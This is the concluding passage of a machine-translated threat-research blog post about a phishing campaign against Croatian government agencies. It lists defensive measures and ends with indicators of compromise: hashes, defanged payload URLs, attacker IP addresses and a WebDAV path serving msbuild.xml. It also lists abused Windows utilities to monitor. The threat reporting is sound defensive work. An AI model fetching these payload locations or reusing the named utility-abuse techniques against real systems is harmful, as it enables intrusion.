<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">結論</font></font></h2><br><font style="vertical-align: inherit;"></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=https://www.google.com/url%3Fq%3D"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ニュース</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">で</font><font style="vertical-align: inherit;">
ドキュメントが発見された翌日、</font><font style="vertical-align: inherit;">標的を絞ったフィッシング攻撃に関するクロアチアの情報システムセキュリティ省への</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=https://www.google.com/url%3Fq%3D"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">リンク</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">を</font><font style="vertical-align: inherit;">含むプレスリリースが発行されました</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">痕跡は国のいくつかの政府機関で発見されました。</font><font style="vertical-align: inherit;">電子メールがフィッシングサイトへのリンクとともに被害者に送信されたと報告されており、そこから悪意のあるドキュメントをダウンロードすることが提案され、そこから分析が開始されました。</font><font style="vertical-align: inherit;">これにより、攻撃チェーンのミッシングリンクが埋められます。最終的には、このような攻撃による被害を軽減できる保護方法に注意を払います。</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一部の信頼できるプログラム（certutil、regsvr32、msbuild、net、wmicなど）の使用の監視と制御</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">メールの添付ファイルだけでなく、Webリンクのチェックと分析</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">企業ネットワーク上のPCメモリの定期的なスキャン</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C2 Silent Trinityへの接続の成功（TLSのもとでも）は</font><font style="vertical-align: inherit;">、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PT Network Attack Discovery</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">を使用して検出できます。</font><font style="vertical-align: inherit;">さらに、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">コミュニティ用に検出を公開したリポジトリでも検出できます。</font></font></a></li>
</ul><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">投稿者</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Alexey Vishnyakov、Positive Technologies </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
PSこのテーマについて、著者はPositive Hack Days 9カンファレンスでの講演も読んでおり、このビデオやその他のプレゼンテーションのビデオは</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">www.phdays.com/en/broadcast/でご覧いただけ</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ます。</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">妥協の指標：</font></font></b><div class="spoiler_text">0adb7204ce6bde667c5abd31e4dea164<br>
13db33c83ee680e0a3b454228462e73f<br>
78184cd55d192cdf6272527c62d2ff89<br>
79e72899af1e50c18189340e4a1e46e0<br>
831b08d0c650c8ae9ab8b4a10a199192<br>
92530d1b546ddf2f0966bbe10771521f<br>
c84b7c871bfcd346b3246364140cd60f<br>
hxxps://postahr.vip/page/1/update.sct<br>
hxxps://posteitaliane.live/owa/mail/archive.srf<br>
hxxps://konzum.win/bat3.txt<br>
hxxp://198.46.182.158/bat3.txt<br>
hxxps://176.105.255.59:8089<br>
[\\]176.105.255.59\webdav\msbuild.xml<br>
postahr.online<br>
176.105.254.52<br>
93.170.105.32</div></div></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ja458752/index.html">Tic Tac Toeパート1：SvelteおよびCanvas 2D</a></li>
<li><a href="../ja458754/index.html">フンコロガシ用GPS：マルチモーダルオリエンテーションシステム</a></li>
<li><a href="../ja458756/index.html">GoPractice Simulatorでデータ駆動型であることをどのように学んだか</a></li>
<li><a href="../ja458758/index.html">翻訳された文学の素晴らしさと貧困</a></li>
<li><a href="../ja458760/index.html">ラスベガスの展示会は、消費者向けではなく、エレクトロニクス開発者向けです。Design Automation Conferenceからのレポート</a></li>
<li><a href="../ja458768/index.html">GolangConfに来る5-6の理由</a></li>
<li><a href="../ja458770/index.html">RTOSに関する真実。記事＃29。Nucleus SEの中断</a></li>
<li><a href="../ja458774/index.html">機能的なDBMS</a></li>
<li><a href="../ja458778/index.html">Satellite 6.5 Reporting Engine：何を、そしてなぜ</a></li>
<li><a href="../ja458782/index.html">ZXスペクトラムのプログラムを最新の手段でTR-DOSに適合させます。パート3</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>